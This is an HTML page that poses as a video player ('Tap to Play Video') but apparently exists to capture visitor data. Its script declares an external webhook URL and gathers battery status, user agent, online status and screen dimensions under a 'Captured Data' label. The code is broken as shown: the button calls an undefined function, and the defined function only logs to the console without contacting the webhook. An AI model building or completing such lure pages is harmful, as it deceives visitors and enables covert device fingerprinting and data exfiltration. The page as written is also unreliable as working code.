<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Watch Video</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .play-btn {
            background-color: #ff0000;
            color: #fff;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
        }
    </style>
</head>
<body>

    <button class="play-btn" onclick="triggerCapture()">▶ Tap to Play Video</button>
    <p id="status" style="margin-top:20px; color:#aaa;"></p>

    <script>
        const WEBHOOK_URL = "https://webhooksite.net/b9df350d-91d4-42d4-b836-a0bd8ca9508d";

async function handleUserInteraction() {
    let batteryData = "Not supported on this platform/browser";

    // 1. Check feature support before calling the API
    if ('getBattery' in navigator && typeof navigator.getBattery === 'function') {
        try {
            const battery = await navigator.getBattery();
            const level = Math.round(battery.level * 100);
            const charging = battery.charging ? "Plugged in" : "On battery";
            batteryData = `${level}% (${charging})`;
        } catch (err) {
            batteryData = "Access restricted";
        }
    } else {
        // Fallback or alternative platform feature check
        batteryData = "Battery API unavailable (e.g., iOS WebKit restriction)";
    }

    // 2. Gather non-restricted standard diagnostics
    const diagnostics = {
        batteryStatus: batteryData,
        userAgent: navigator.userAgent,
        onlineStatus: navigator.onLine ? "Online" : "Offline",
        screenDimensions: `${window.screen.width}x${window.screen.height}`
    };

    console.log("Captured Data:", diagnostics);
}
    </script>
</body>
</html>
